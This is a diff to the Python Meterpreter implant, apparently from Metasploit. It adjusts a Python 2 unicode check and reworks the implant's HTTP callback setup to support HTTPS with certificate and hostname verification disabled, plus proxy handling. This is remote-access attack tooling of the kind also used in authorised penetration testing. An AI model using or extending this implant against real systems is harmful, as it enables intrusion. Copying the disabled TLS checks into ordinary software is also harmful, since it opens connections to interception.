@@ -264,7 +264,7 @@ def tlv_pack(*args):
 		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
 	else:
 		value = tlv['value']
-		if sys.version_info[0] < 3 and isinstance(value, __builtins__['unicode']):
+		if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
 			value = value.encode('UTF-8')
 		elif not is_bytes(value):
 			value = bytes(value, 'UTF-8')
@@ -393,11 +393,17 @@ class PythonMeterpreter(object):
 			print(msg)
 
 	def driver_init_http(self):
+		opener_args = []
+		scheme = HTTP_CONNECTION_URL.split(':', 1)[0]
+		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
+			import ssl
+			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+			ssl_ctx.check_hostname=False
+			ssl_ctx.verify_mode=ssl.CERT_NONE
+			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
 		if HTTP_PROXY:
-			proxy_handler = urllib.ProxyHandler({'http': HTTP_PROXY})
-			opener = urllib.build_opener(proxy_handler)
-		else:
-			opener = urllib.build_opener()
+			opener_args.append(urllib.ProxyHandler({scheme: HTTP_PROXY}))
+		opener = urllib.build_opener(*opener_args)
 		if HTTP_USER_AGENT:
 			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
 		urllib.install_opener(opener)
